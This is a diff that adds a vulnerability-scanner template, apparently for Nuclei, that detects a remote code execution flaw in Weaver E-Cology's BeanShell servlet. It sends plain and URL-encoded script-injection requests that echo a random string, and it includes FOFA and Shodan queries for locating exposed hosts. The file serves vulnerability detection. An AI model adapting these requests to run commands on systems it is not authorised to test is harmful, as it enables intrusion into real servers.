@@ -1,0 +1,53 @@
+http:
+- matchers:
+  - condition: and
+    regex:
+    - BeanShell Test Servlet
+    - '(?i)<pre>(
+
+      .*){{randstr}}'
+    type: regex
+  - status:
+    - 200
+    type: status
+  matchers-condition: and
+  raw:
+  - 'POST /weaver/bsh.servlet.BshServlet HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Content-Type: application/x-www-form-urlencoded
+
+
+    bsh.script=print%28%22{{randstr}}%22%29%3B
+
+    '
+  - 'POST /weaver/bsh.servlet.BshServlet HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Content-Type: application/x-www-form-urlencoded
+
+
+    %62%73%68%2e%73%63%72%69%70%74=%70%72%69%6e%74%28%22{{randstr}}%22%29%3b
+
+    '
+id: weaver-ecology-bshservlet-rce
+info:
+  author: SleepingBag945
+  classification:
+    cpe: cpe:2.3:a:weaver:e-cology:*:*:*:*:*:*:*:*
+  description: 'Weaver BeanShell contains a remote command execution vulnerability
+    in the bsh.servlet.BshServlet program.
+
+    '
+  metadata:
+    fofa-query: "app=\"\u6CDB\u5FAE-\u534F\u540C\u529E\u516COA\""
+    max-request: 2
+    product: e-cology
+    shodan-query: ecology_JSessionid
+    vendor: weaver
+    verified: true
+  name: Weaver E-Cology BeanShell - Remote Command Execution
+  severity: critical
+  tags: beanshell,rce,weaver,vuln
